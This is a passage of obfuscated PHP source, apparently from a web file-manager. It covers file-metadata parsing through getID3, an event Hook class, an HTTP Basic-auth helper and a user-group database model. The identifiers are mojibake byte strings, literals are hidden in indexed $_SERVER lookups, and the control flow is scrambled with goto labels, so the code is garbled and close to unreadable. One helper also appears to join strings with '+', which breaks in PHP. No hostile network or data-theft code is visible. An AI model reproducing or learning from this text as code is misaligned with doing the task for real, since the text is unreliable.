$F°¢‡½ÄÉÂ[1606]) { $Fî­Óƒù–« = self::psdParse($b—©öŠ•†ä); $eÄ¶õùÎ×Ù = $F°¢‡½ÄÉÂ[1607]; } else { if ($a‹›¹¦š‡[$F°¢‡½ÄÉÂ[160]] == $F°¢‡½ÄÉÂ[1608]) { $Fî­Óƒù–« = self::pdfParse($b—©öŠ•†ä); } else { $eÄ¶õùÎ×Ù = self::$fileTypeArray[$F°¢‡½ÄÉÂ[1609]][$a‹›¹¦š‡[$F°¢‡½ÄÉÂ[160]]]; $f¶äÍÁ³ = self::$fileTypeArray[$F°¢‡½ÄÉÂ[1610]][$eÄ¶õùÎ×Ù][$F°¢‡½ÄÉÂ[1611]]; $aˆâÒíìƒ = @$b¬¬ —­ˆé->analyze($b—©öŠ•†ä, $a‹›¹¦š‡[$F°¢‡½ÄÉÂ[77]], $a‹›¹¦š‡[$F°¢‡½ÄÉÂ[28]]); $Fî­Óƒù–« = self::parseData($aˆâÒíìƒ, $f¶äÍÁ³, $a‹›¹¦š‡); } } } catch (Exception $fâå„“¿±Š) { $Fî­Óƒù–« = array($F°¢‡½ÄÉÂ[372] => $eÄ¶õùÎ×Ù); } if (!$Fî­Óƒù–«) { return; } goto d¼î…Á«Å”; F¨„È„øÛ: if (!$a‹›¹¦š‡ || $a‹›¹¦š‡[$F°¢‡½ÄÉÂ[29]] != $F°¢‡½ÄÉÂ[167]) { return; } if (!self::support($a‹›¹¦š‡[$F°¢‡½ÄÉÂ[160]]) || isset($a‹›¹¦š‡[$F°¢‡½ÄÉÂ[426]])) { return; } $b—©öŠ•†ä = $F°¢‡½ÄÉÂ[1605] . $a‹›¹¦š‡[$F°¢‡½ÄÉÂ[75]]; goto e²±¤Åºì; eÍº††ÕÁ: $F°¢‡½ÄÉÂ =& $_SERVER[Î¿—”òá]; static $b¬¬ —­ˆé; if (!$b¬¬ —­ˆé) { require SDK_DIR . $F°¢‡½ÄÉÂ[1604]; $b¬¬ —­ˆé = new getID3(); } goto F¨„È„øÛ; B‡¡ø™æ†¤: } public static function support($BØÅ ¥ÜÉõ) { goto BÏ’ÔõİŞ; f‡‘ÙãÁà: return !1; goto fì“ÉÇ…Şá; BÏ’ÔõİŞ: $FÉÌ¹‡ÑÂ =& $_SERVER[Î¿—”òá]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $BØÅ ¥ÜÉõ = strtolower($BØÅ ¥ÜÉõ); goto f ±ÎØÛÔ¶; f ±ÎØÛÔ¶: $e”ˆÔÓŞŸ„ = array($FÉÌ¹‡ÑÂ[1608], $FÉÌ¹‡ÑÂ[1606]); if (in_array($BØÅ ¥ÜÉõ, $e”ˆÔÓŞŸ„)) { return !0; } if (isset(self::$fileTypeArray[$FÉÌ¹‡ÑÂ[1609]][$BØÅ ¥ÜÉõ])) { return !0; } goto f‡‘ÙãÁà; fì“ÉÇ…Şá: } private static function parseData($càˆäù»’¬, $dÓÚ¯­Î›, $Dµ¸Â¸‹Ã) { $aøèÖ»…µÃ =& $_SERVER[Î¿—”òá]; $E£¦“í˜ó = $càˆäù»’¬[$aøèÖ»…µÃ[1612]]; $F¤ß¤ø™Ù¿ = array(); foreach ($dÓÚ¯­Î› as $C«‘µºİË¸ => $eŸùêÎƒ˜) { foreach ($eŸùêÎƒ˜ as $C³­ßå ‡É) { if (is_array($C³­ßå ‡É)) { $cÁ­Ê‡ß›Ó = self::parseData($càˆäù»’¬, $eŸùêÎƒ˜, $Dµ¸Â¸‹Ã); if ($cÁ­Ê‡ß›Ó) { $F¤ß¤ø™Ù¿[$C«‘µºİË¸] = $cÁ­Ê‡ß›Ó; } break; } $cÕ·„»ßÂ = str_replace($aøèÖ»…µÃ[1382], $E£¦“í˜ó, $C³­ßå ‡É); $cÁ­Ê‡ß›Ó = _get($càˆäù»’¬, $cÕ·„»ßÂ); $cÁ­Ê‡ß›Ó = is_array($cÁ­Ê‡ß›Ó) ? $cÁ­Ê‡ß›Ó[0] : $cÁ­Ê‡ß›Ó; if ($cÁ­Ê‡ß›Ó) { break; } } if ($cÁ­Ê‡ß›Ó || $cÁ­Ê‡ß›Ó === 0 || $cÁ­Ê‡ß›Ó === !1) { $cÁ­Ê‡ß›Ó = self::valueReset($C³­ßå ‡É, $cÁ­Ê‡ß›Ó, $C«‘µºİË¸); if ($cÁ­Ê‡ß›Ó !== null) { $F¤ß¤ø™Ù¿[$C«‘µºİË¸] = $cÁ­Ê‡ß›Ó; } } } $F¤ß¤ø™Ù¿ = self::valueResetAll($F¤ß¤ø™Ù¿, $Dµ¸Â¸‹Ã); return $F¤ß¤ø™Ù¿; } private static function psdParse($e¥®Î­„„) { $b„†Èö¦Ö„ =& $_SERVER[Î¿—”òá]; if (IO::fileSubstr($e¥®Î­„„, 0, 4) != $b„†Èö¦Ö„[1613]) { return !1; } $F§ëÌäø¡Â = getImageSize($e¥®Î­„„, $Bß­òùƒ¸); if (!$F§ëÌäø¡Â) { return; } $a¯™…ä×‹ = array($b„†Èö¦Ö„[1528] => $F§ëÌäø¡Â[0], $b„†Èö¦Ö„[1530] => $F§ëÌäø¡Â[1]); return $a¯™…ä×‹; } private static function pdfParse($A‰Ï¯Šìêç) { return FileParsePdf::parse($A‰Ï¯Šìêç); } private static function fileTypeParse() { $B¯Ô”ä‘• =& $_SERVER[Î¿—”òá]; $AƒÈ£†¬“ = self::fileTypeArray(); $aÂ¥¼¦¢Œ = array(); foreach ($AƒÈ£†¬“ as $A˜Øİ‹ÃÒï => $dËÃÛç‘Ç„) { $CŸä­¬µîŠ = _get($dËÃÛç‘Ç„, $B¯Ô”ä‘•[160], $B¯Ô”ä‘•[33]); $eÓ¶ …–…„ = is_string($CŸä­¬µîŠ) ? explode($B¯Ô”ä‘•[47], $CŸä­¬µîŠ) : $CŸä­¬µîŠ; if (!$eÓ¶ …–…„) { continue; } foreach ($eÓ¶ …–…„ as $CŸä­¬µîŠ) { $CŸä­¬µîŠ = strtolower(trim($CŸä­¬µîŠ)); if (!$CŸä­¬µîŠ) { continue; } $aÂ¥¼¦¢Œ[$CŸä­¬µîŠ] = $A˜Øİ‹ÃÒï; } $AƒÈ£†¬“[$A˜Øİ‹ÃÒï][$B¯Ô”ä‘•[160]] = array_keys($aÂ¥¼¦¢Œ); $AƒÈ£†¬“[$A˜Øİ‹ÃÒï][$B¯Ô”ä‘•[1611]] = self::parseKeyMap($dËÃÛç‘Ç„[$B¯Ô”ä‘•[1611]]); } return array($B¯Ô”ä‘•[1610] => $AƒÈ£†¬“, $B¯Ô”ä‘•[1609] => $aÂ¥¼¦¢Œ); } private static function parseKeyMap($fùô¦ƒ¸ƒ) { $AÛ¿ÁšÇŞŞ =& $_SERVER[Î¿—”òá]; foreach ($fùô¦ƒ¸ƒ as $c¾Ê£ôŸ‡œ => $C…æ¨—½´) { if (is_array($C…æ¨—½´)) { $aÛºÃ¤Œ™Ñ = self::parseKeyMap($C…æ¨—½´); if ($aÛºÃ¤Œ™Ñ) { $fùô¦ƒ¸ƒ[$c¾Ê£ôŸ‡œ] = $aÛºÃ¤Œ™Ñ; } continue; } $AÉê˜Ç›å˜ = explode($AÛ¿ÁšÇŞŞ[47], $C…æ¨—½´); $AğºÒ­§åõ = array(); foreach ($AÉê˜Ç›å˜ as $fÖĞˆ£ğÂô) { $fÖĞˆ£ğÂô = trim($fÖĞˆ£ğÂô); if (!$fÖĞˆ£ğÂô) { continue; } if (preg_match($AÛ¿ÁšÇŞŞ[1614], $fÖĞˆ£ğÂô, $f¤ãé¬°Â)) { $C‡ğ·œŞìÕ = explode($AÛ¿ÁšÇŞŞ[271], $f¤ãé¬°Â[1]); foreach ($C‡ğ·œŞìÕ as $Cê‡Ü³™ç‡) { $AğºÒ­§åõ[] = str_replace($f¤ãé¬°Â[0], $Cê‡Ü³™ç‡, $fÖĞˆ£ğÂô); } } else { $AğºÒ­§åõ[] = $fÖĞˆ£ğÂô; } } $fùô¦ƒ¸ƒ[$c¾Ê£ôŸ‡œ] = $AğºÒ­§åõ; } return $fùô¦ƒ¸ƒ; } private static function valueResetAll($c£ŸéÍ¹ª, $bÓ§˜ŒÎÑ) { goto aê‡¢—õä¥; BŞëİøÊæ: if ($BöØ¹µã‚à) { $d¤ÛÍä’á = IO_PATH_SYSTEM_TEMP . $AŠÊÏÎß[1620] . KodIO::hashPath($bÓ§˜ŒÎÑ) . $AŠÊÏÎß[1621]; $c£ŸéÍ¹ª[$AŠÊÏÎß[1622]] = Action($AŠÊÏÎß[1623])->pluginCacheFileSet($d¤ÛÍä’á, $BöØ¹µã‚à); unset($c£ŸéÍ¹ª[$AŠÊÏÎß[1624]][$AŠÊÏÎß[1607]]); } $E…ö¢ Øµ– = _get($c£ŸéÍ¹ª, $AŠÊÏÎß[1625], $AŠÊÏÎß[33]); $döù³È²Ì© = _get($c£ŸéÍ¹ª, $AŠÊÏÎß[1626], $AŠÊÏÎß[33]); goto a¦è‘¢ß; f’µó‹Øá–: return $c£ŸéÍ¹ª; goto AØŞºÍ¥ò; a¦è‘¢ß: $EÃ„†„Óƒ = _get($c£ŸéÍ¹ª, $AŠÊÏÎß[1627], $AŠÊÏÎß[33]); $b¥Ò¬¹À’ = $E…ö¢ Øµ– . $döù³È²Ì© . $EÃ„†„Óƒ; if ($b¥Ò¬¹À’ && get_charset($b¥Ò¬¹À’) != $AŠÊÏÎß[326]) { $c£ŸéÍ¹ª[$AŠÊÏÎß[1624]][$AŠÊÏÎß[1335]] = iconv_to($c£ŸéÍ¹ª[$AŠÊÏÎß[1624]][$AŠÊÏÎß[1335]], get_charset($b¥Ò¬¹À’), $AŠÊÏÎß[326]); $c£ŸéÍ¹ª[$AŠÊÏÎß[1624]][$AŠÊÏÎß[1628]] = iconv_to($c£ŸéÍ¹ª[$AŠÊÏÎß[1624]][$AŠÊÏÎß[1628]], get_charset($b¥Ò¬¹À’), $AŠÊÏÎß[326]); $c£ŸéÍ¹ª[$AŠÊÏÎß[1624]][$AŠÊÏÎß[1629]] = iconv_to($c£ŸéÍ¹ª[$AŠÊÏÎß[1624]][$AŠÊÏÎß[1629]], get_charset($b¥Ò¬¹À’), $AŠÊÏÎß[326]); } goto f’µó‹Øá–; aê‡¢—õä¥: $AŠÊÏÎß =& $_SERVER[Î¿—”òá]; if (isset($c£ŸéÍ¹ª[$AŠÊÏÎß[1615]])) { $D±”Àˆ„îŠ = ceil($c£ŸéÍ¹ª[$AŠÊÏÎß[1615]]); $EÕ·§ƒ˜Â¦ = intval($D±”Àˆ„îŠ / 3600); $eñ•’‚ÕÙÛ = intval(($D±”Àˆ„îŠ - $EÕ·§ƒ˜Â¦ * 3600) / 60); $AğË÷Ù‡ç… = $D±”Àˆ„îŠ % 60; $c£ŸéÍ¹ª[$AŠÊÏÎß[1616]] = sprintf($AŠÊÏÎß[1617], $EÕ·§ƒ˜Â¦, $eñ•’‚ÕÙÛ, $AğË÷Ù‡ç…); if ($EÕ·§ƒ˜Â¦ == 0) { $c£ŸéÍ¹ª[$AŠÊÏÎß[1616]] = sprintf($AŠÊÏÎß[1618], $eñ•’‚ÕÙÛ, $AğË÷Ù‡ç…); } } $BöØ¹µã‚à = _get($c£ŸéÍ¹ª, $AŠÊÏÎß[1619]); goto BŞëİøÊæ; AØŞºÍ¥ò: } private static function valueReset($eÂèÇøŸŸÄ, $BßáİÊÏ¯Á, $FØƒÕ„Ó®) { $A×»å‹ª =& $_SERVER[Î¿—”òá]; $f‰é‡ù´½ = $A×»å‹ª[1545]; switch ($eÂèÇøŸŸÄ) { case $A×»å‹ª[1630]: $BßáİÊÏ¯Á = $BßáİÊÏ¯Á == $A×»å‹ª[83] ? $A×»å‹ª[1631] : $A×»å‹ª[1632]; break; case $A×»å‹ª[1633]: $BßáİÊÏ¯Á = $BßáİÊÏ¯Á ? $BßáİÊÏ¯Á : null; break; default: break; } switch ($FØƒÕ„Ó®) { case $A×»å‹ª[1634]: $BßáİÊÏ¯Á = round($BßáİÊÏ¯Á, 2); break; case $A×»å‹ª[187]: case $A×»å‹ª[107]: if ($BßáİÊÏ¯Á < 0) { $BßáİÊÏ¯Á = null; } else { if (is_numeric($BßáİÊÏ¯Á)) { $BßáİÊÏ¯Á = date($f‰é‡ù´½, $BßáİÊÏ¯Á); } } break; default: break; } return $BßáİÊÏ¯Á; } private static function fileTypeArray() { $C®™·½šÒ« =& $_SERVER[Î¿—”òá]; return array($C®™·½šÒ«[1607] => array($C®™·½šÒ«[160] => $C®™·½šÒ«[1635] . $C®™·½šÒ«[1636], $C®™·½šÒ«[1611] => array($C®™·½šÒ«[1528] => $C®™·½šÒ«[1637], $C®™·½šÒ«[1530] => $C®™·½šÒ«[1638], $C®™·½šÒ«[1639] => $C®™·½šÒ«[1640], $C®™·½šÒ«[1641] => $C®™·½šÒ«[1642], $C®™·½šÒ«[187] => $C®™·½šÒ«[1643], $C®™·½šÒ«[107] => $C®™·½šÒ«[1644], $C®™·½šÒ«[1645] => $C®™·½šÒ«[1646], $C®™·½šÒ«[1647] => $C®™·½šÒ«[1648], $C®™·½šÒ«[1649] => $C®™·½šÒ«[1650], $C®™·½šÒ«[1651] => $C®™·½šÒ«[1652], $C®™·½šÒ«[1653] => $C®™·½šÒ«[1654], $C®™·½šÒ«[1655] => $C®™·½šÒ«[1656], $C®™·½šÒ«[1657] => $C®™·½šÒ«[1658], $C®™·½šÒ«[1659] => array($C®™·½šÒ«[1660] => $C®™·½šÒ«[1661], $C®™·½šÒ«[1662] => $C®™·½šÒ«[1663], $C®™·½šÒ«[1664] => $C®™·½šÒ«[1665]), $C®™·½šÒ«[1666] => $C®™·½šÒ«[1667], $C®™·½šÒ«[1668] => $C®™·½šÒ«[1669], $C®™·½šÒ«[1670] => $C®™·½šÒ«[1671], $C®™·½šÒ«[1672] => $C®™·½šÒ«[1673], $C®™·½šÒ«[1674] => array($C®™·½šÒ«[1675] => $C®™·½šÒ«[1676], $C®™·½šÒ«[1677] => $C®™·½šÒ«[1678], $C®™·½šÒ«[1679] => $C®™·½šÒ«[1680], $C®™·½šÒ«[1681] => $C®™·½šÒ«[1682], $C®™·½šÒ«[1683] => $C®™·½šÒ«[1684], $C®™·½šÒ«[1685] => $C®™·½šÒ«[1686], $C®™·½šÒ«[1687] => $C®™·½šÒ«[1688], $C®™·½šÒ«[1689] => $C®™·½šÒ«[1690], $C®™·½šÒ«[1691] => $C®™·½šÒ«[1692], $C®™·½šÒ«[1693] => $C®™·½šÒ«[1694], $C®™·½šÒ«[1695] => $C®™·½šÒ«[1696]))), $C®™·½šÒ«[1697] => array($C®™·½šÒ«[160] => $C®™·½šÒ«[1698] . $C®™·½šÒ«[1699], $C®™·½šÒ«[1611] => array($C®™·½šÒ«[1615] => $C®™·½šÒ«[1700], $C®™·½šÒ«[187] => $C®™·½šÒ«[1701], $C®™·½šÒ«[107] => $C®™·½šÒ«[1702], $C®™·½šÒ«[1647] => $C®™·½šÒ«[1703], $C®™·½šÒ«[1704] => $C®™·½šÒ«[1705], $C®™·½šÒ«[1706] => $C®™·½šÒ«[1633], $C®™·½šÒ«[1707] => $C®™·½šÒ«[1708], $C®™·½šÒ«[1709] => $C®™·½šÒ«[1710], $C®™·½šÒ«[1711] => $C®™·½šÒ«[1712], $C®™·½šÒ«[1624] => array($C®™·½šÒ«[1335] => $C®™·½šÒ«[1713], $C®™·½šÒ«[1628] => $C®™·½šÒ«[1714], $C®™·½šÒ«[1629] => $C®™·½šÒ«[1715], $C®™·½šÒ«[1716] => $C®™·½šÒ«[1717], $C®™·½šÒ«[1718] => $C®™·½šÒ«[1719], $C®™·½šÒ«[1720] => $C®™·½šÒ«[1721], $C®™·½šÒ«[1607] => $C®™·½šÒ«[1722]))), $C®™·½šÒ«[1723] => array($C®™·½šÒ«[160] => $C®™·½šÒ«[1724] . $C®™·½šÒ«[1725], $C®™·½šÒ«[1611] => array($C®™·½šÒ«[1528] => $C®™·½šÒ«[1726], $C®™·½šÒ«[1530] => $C®™·½šÒ«[1727], $C®™·½šÒ«[1615] => $C®™·½šÒ«[1700], $C®™·½šÒ«[187] => $C®™·½šÒ«[1728], $C®™·½šÒ«[107] => $C®™·½šÒ«[1729], $C®™·½šÒ«[1634] => $C®™·½šÒ«[1730], $C®™·½šÒ«[1711] => $C®™·½šÒ«[1731], $C®™·½šÒ«[1707] => $C®™·½šÒ«[1732], $C®™·½šÒ«[1647] => $C®™·½šÒ«[1733], $C®™·½šÒ«[1697] => array($C®™·½šÒ«[1706] => $C®™·½šÒ«[1633], $C®™·½šÒ«[1734] => $C®™·½šÒ«[1735], $C®™·½šÒ«[1704] => $C®™·½šÒ«[1705], $C®™·½šÒ«[1711] => $C®™·½šÒ«[1712], $C®™·½šÒ«[1707] => $C®™·½šÒ«[1736], $C®™·½šÒ«[1709] => $C®™·½šÒ«[1710]))), $C®™·½šÒ«[1737] => array($C®™·½šÒ«[1611] => array($C®™·½šÒ«[1738] => $C®™·½šÒ«[1739], $C®™·½šÒ«[1740] => $C®™·½šÒ«[1741])), $C®™·½šÒ«[1742] => array($C®™·½šÒ«[1611] => array())); } } class Hook { private static $events = array(); public static function get($bœğğß‹Ôã = false) { if (!$bœğğß‹Ôã) { return self::$events; } else { return self::$events[$bœğğß‹Ôã]; } } public static function apply($aº“Ï×“æï, $EïÜâÇ­¼İ = array()) { $aÑÀåø¦—Ç = ActionApply($aº“Ï×“æï, $EïÜâÇ­¼İ); if (is_string($aº“Ï×“æï)) { Hook::trigger($aº“Ï×“æï); } return $aÑÀåø¦—Ç; } public static function bind($E˜‚…²…ªŞ, $b–õòô…Œİ, $FÊçÈ¬¡‹ó = false) { $eëìš‹óÍ =& $_SERVER[Î¿—”òá]; if (!isset(self::$events[$E˜‚…²…ªŞ])) { self::$events[$E˜‚…²…ªŞ] = array(); } self::$events[$E˜‚…²…ªŞ][] = array($eëìš‹óÍ[1743] => $b–õòô…Œİ, $eëìš‹óÍ[1744] => $FÊçÈ¬¡‹ó, $eëìš‹óÍ[1745] => 0); } public static function once($a³‰Ş´Ã, $Dø‰Ï¸Ô£ƒ) { self::bind($a³‰Ş´Ã, $Dø‰Ï¸Ô£ƒ, !0); } public static function unbind($fßŞİ¹ğÁ†, $D®ì¾£ò¶Ï = false) { if (!$D®ì¾£ò¶Ï) { self::$events[$fßŞİ¹ğÁ†] = array(); return; } $Bà—¾š–×ò = self::$events[$fßŞİ¹ğÁ†]; self::$events[$fßŞİ¹ğÁ†] = array(); if (!is_array($Bà—¾š–×ò)) { return; } for ($a’İ¯ğõô  = 0; $a’İ¯ğõô  < count($Bà—¾š–×ò); $a’İ¯ğõô ++) { if ($Bà—¾š–×ò[$a’İ¯ğõô ][$_SERVER[Î¿—”òá][1743]] == $D®ì¾£ò¶Ï) { continue; } self::$events[$fßŞİ¹ğÁ†][] = $Bà—¾š–×ò[$a’İ¯ğõô ]; } } public static function filter($f¦Ç¼¦ˆÌî, $A˜»’‡Ğ¡) { goto d¢æ•®ŠÖÖ; cõ¯àÑœ¼Ã: $C¶¼‰…¸º„ = $a¿øå…„Ò[$f¦Ç¼¦ˆÌî]; $aé±ì˜Ï‹¥ = $A˜»’‡Ğ¡; if (!is_array($C¶¼‰…¸º„) || count($C¶¼‰…¸º„) == 0) { return $aé±ì˜Ï‹¥; } goto C²±ƒ„æò ; d¢æ•®ŠÖÖ: $D›‚õ¥Ç±µ =& $_SERVER[Î¿—”òá]; $a¿øå…„Ò = self::$events; if (!isset($a¿øå…„Ò[$f¦Ç¼¦ˆÌî])) { return $A˜»’‡Ğ¡; } goto cõ¯àÑœ¼Ã; C²±ƒ„æò : for ($eĞ”å¾™ô÷ = 0; $eĞ”å¾™ô÷ < count($C¶¼‰…¸º„); $eĞ”å¾™ô÷++) { $b×–îâ„“ = $C¶¼‰…¸º„[$eĞ”å¾™ô÷]; if ($b×–îâ„“[$D›‚õ¥Ç±µ[1744]] && $b×–îâ„“[$D›‚õ¥Ç±µ[1745]] > 1) { continue; } self::$events[$f¦Ç¼¦ˆÌî][$eĞ”å¾™ô÷][$D›‚õ¥Ç±µ[1745]] = $b×–îâ„“[$D›‚õ¥Ç±µ[1745]] + 1; $BÔÎÍï…ÇÆ = self::apply($b×–îâ„“[$D›‚õ¥Ç±µ[1743]], array($aé±ì˜Ï‹¥)); if (gettype($BÔÎÍï…ÇÆ) == gettype($aé±ì˜Ï‹¥)) { $aé±ì˜Ï‹¥ = $BÔÎÍï…ÇÆ; } } return $aé±ì˜Ï‹¥; goto CÍŒØã‘; CÍŒØã‘: } public static function trigger($CÜ¢ˆÜ“ç) { goto A‘Šóªø£­; CŸÇæßá¥: if (!isset($FæíÇäÍÕ[$CÜ¢ˆÜ“ç])) { return $E´ÙÇ ¹; } $dÜæÖ¸Äñ© = $FæíÇäÍÕ[$CÜ¢ˆÜ“ç]; if (!is_array($dÜæÖ¸Äñ©) || count($dÜæÖ¸Äñ©) == 0) { return $E´ÙÇ ¹; } goto FÑ„†Ìàò¬; dÓ‹£ãÔ™á: return $E´ÙÇ ¹; goto A´èãàõÊ; FÑ„†Ìàò¬: $cœ¡ø¨Ï› = func_get_args(); array_shift($cœ¡ø¨Ï›); for ($bÓê»…·‹’ = 0; $bÓê»…·‹’ < count($dÜæÖ¸Äñ©); $bÓê»…·‹’++) { $FêÖç‰´å = $dÜæÖ¸Äñ©[$bÓê»…·‹’]; if ($FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1744]] && $FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1745]] > 1) { continue; } if (defined($CÛÂ›ÎÉÆÄ[1746]) && GLOBAL_LOG_HOOK) { write_log($CÜ¢ˆÜ“ç . $CÛÂ›ÎÉÆÄ[1747] . $FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1743]], $CÛÂ›ÎÉÆÄ[1748]); } self::$events[$CÜ¢ˆÜ“ç][$bÓê»…·‹’][$CÛÂ›ÎÉÆÄ[1745]] = $FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1745]] + 1; $f½ÏÛ¤© = self::apply($FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1743]], $cœ¡ø¨Ï›); if (defined($CÛÂ›ÎÉÆÄ[1746]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $CÛÂ›ÎÉÆÄ[1748]); if ($FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1745]] == 200) { $Dƒ¿¦óö = is_array($FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1743]]) ? json_encode_force($FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1743]]) : $FêÖç‰´å[$CÛÂ›ÎÉÆÄ[1743]]; write_log($CÛÂ›ÎÉÆÄ[1749] . $CÜ¢ˆÜ“ç . $CÛÂ›ÎÉÆÄ[1750] . $Dƒ¿¦óö, $CÛÂ›ÎÉÆÄ[1751]); } } $E´ÙÇ ¹ = is_null($f½ÏÛ¤©) ? $E´ÙÇ ¹ : $f½ÏÛ¤©; } goto dÓ‹£ãÔ™á; A‘Šóªø£­: $CÛÂ›ÎÉÆÄ =& $_SERVER[Î¿—”òá]; $FæíÇäÍÕ = self::$events; $E´ÙÇ ¹ = !1; goto CŸÇæßá¥; A´èãàõÊ: } } class HttpAuth { public static function get() { $B‹ï¥ˆéè =& $_SERVER[Î¿—”òá]; $AŒí–Ùóîô = $B‹ï¥ˆéè[33]; $bÜ‡åÖƒÚô = $B‹ï¥ˆéè[33]; if (isset($_SERVER[$B‹ï¥ˆéè[1752]])) { $AŒí–Ùóîô = $_SERVER[$B‹ï¥ˆéè[1752]]; $bÜ‡åÖƒÚô = $_SERVER[$B‹ï¥ˆéè[1753]]; } elseif (isset($_SERVER[$B‹ï¥ˆéè[1754]])) { $fÃˆùµ¾¦ = $_SERVER[$B‹ï¥ˆéè[1754]]; if (strpos(strtolower($fÃˆùµ¾¦), $B‹ï¥ˆéè[1755]) === 0) { $F÷ÈÎŞ¦² = explode($B‹ï¥ˆéè[4], base64_decode(substr($fÃˆùµ¾¦, 6))); $AŒí–Ùóîô = isset($F÷ÈÎŞ¦²[0]) ? $F÷ÈÎŞ¦²[0] : $B‹ï¥ˆéè[33]; $bÜ‡åÖƒÚô = isset($F÷ÈÎŞ¦²[1]) ? $F÷ÈÎŞ¦²[1] : 0; } } return array($B‹ï¥ˆéè[535] => $AŒí–Ùóîô, $B‹ï¥ˆéè[890] => $bÜ‡åÖƒÚô); } public static function error() { goto Bù’Ã„Ü Ô; D²˜‚‰Ûçª: header($C—»¼Šóä[1758]); header($C—»¼Šóä[1759]); header($C—»¼Šóä[1256]); goto CˆšËöÜ´‚; CˆšËöÜ´‚: die; goto dğƒ»Äò÷; Bù’Ã„Ü Ô: $C—»¼Šóä =& $_SERVER[Î¿—”òá]; header($C—»¼Šóä[1756]); header($C—»¼Šóä[1757]); goto D²˜‚‰Ûçª; dğƒ»Äò÷: } public static function make($AİÃŠÆ«Á, $B‰³¼êõÕ‰) { $Eóİ™ø =& $_SERVER[Î¿—”òá]; return $Eóİ™ø[1760] + base64_encode($AİÃŠÆ«Á . $Eóİ™ø[4] . $B‰³¼êõÕ‰); } } goto dœ„µäöĞö; døÌÀßî°È: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\x70"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\x6d\x65" => "\147\162\157\x75\x70\137\155\145\164\x61", "\x6d\145\164\x61\106\151\x65\x6c\x64" => "\147\162\x6f\x75\x70\111\104"); protected function cacheFunctionAlias($cõ¼ÃºäåÛ) { $b¥èÙ¾Á =& $_SERVER[Î¿—”òá]; return array($b¥èÙ¾Á[2163] => array($cõ¼ÃºäåÛ[0], $b¥èÙ¾Á[2164]), $b¥èÙ¾Á[2165] => array($cõ¼ÃºäåÛ[0], $b¥èÙ¾Á[2164])); } protected function getInfo($CÜçæµƒòõ) { $E‹ÆÔßÍË = $this->getInfoSimple($CÜçæµƒòõ); if (!$E‹ÆÔßÍË) { return !1; } return $this->_listDataApplyItem($E‹ÆÔßÍË); } protected function getInfoSimple($C½…†À³‰ï, $aÏ¤†¤Òß˜ = false) { $FµÒä”•ˆ =& $_SERVER[Î¿—”òá]; if ($aÏ¤†¤Òß˜) { $C¥ƒ¿â¤œÒ = array($FµÒä”•ˆ[2097] => intval($C½…†À³‰ï)); $E£÷†¶Ø½ = $this->where($C¥ƒ¿â¤œÒ)->find(); return is_array($E£÷†¶Ø½) ? $E£÷†¶Ø½ : array(); } return $this->cacheFunctionGet($FµÒä”•ˆ[2166], $C½…†À³‰ï); } protected function groupAdd($CÓ·Ú½²Ü ) { goto d¶áòŞ; d¶áòŞ: $cÒŞ¥Ê¶Ø‚ =& $_SERVER[Î¿—”òá]; if (!$CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[461]] && isset($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2097]]) && $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2097]] == 1) { if ($a¡É¹©´·† = $this->getInfoSimple($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2097]], !0)) { return $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2097]]; } } else { $a¡É¹©´·† = $this->getInfoSimple($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[461]]); if (!$a¡É¹©´·†) { return !1; } } $a‘Û›˜ãæ = $cÒŞ¥Ê¶Ø‚[470]; goto DâÛ’»›†ˆ; DâÛ’»›†ˆ: if ($a¡É¹©´·†[$cÒŞ¥Ê¶Ø‚[459]]) { $a‘Û›˜ãæ = $a¡É¹©´·†[$cÒŞ¥Ê¶Ø‚[459]] . $a¡É¹©´·†[$cÒŞ¥Ê¶Ø‚[2097]] . $cÒŞ¥Ê¶Ø‚[47]; } $D¾ÄÖ™¤Ê… = array($cÒŞ¥Ê¶Ø‚[386] => $this->groupNameAuto($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[461]], $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[28]]), $cÒŞ¥Ê¶Ø‚[368] => $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[461]], $cÒŞ¥Ê¶Ø‚[525] => $a‘Û›˜ãæ, $cÒŞ¥Ê¶Ø‚[2167] => $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2081]], $cÒŞ¥Ê¶Ø‚[2168] => 0, $cÒŞ¥Ê¶Ø‚[2101] => 0); if (isset($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2118]])) { $D¾ÄÖ™¤Ê…[$cÒŞ¥Ê¶Ø‚[2118]] = $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2118]]; } else { $AàÎõƒÎ£¢ = $this->max($cÒŞ¥Ê¶Ø‚[2118]); if (!$AàÎõƒÎ£¢) { $AàÎõƒÎ£¢ = 0; } $D¾ÄÖ™¤Ê…[$cÒŞ¥Ê¶Ø‚[2118]] = $AàÎõƒÎ£¢ + 1; } goto D „ÀÍéÒ…; D „ÀÍéÒ…: if (!empty($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2097]])) { $D¾ÄÖ™¤Ê…[$cÒŞ¥Ê¶Ø‚[2097]] = $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2097]]; } $eäÙì‰–­† = $this->add($D¾ÄÖ™¤Ê…); $this->setNamePinyin($eäÙì‰–­†, $D¾ÄÖ™¤Ê…[$cÒŞ¥Ê¶Ø‚[28]]); goto dÅ‚é½Ô²Ñ; dÅ‚é½Ô²Ñ: if (isset($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2169]])) { $this->metaSet($eäÙì‰–­†, 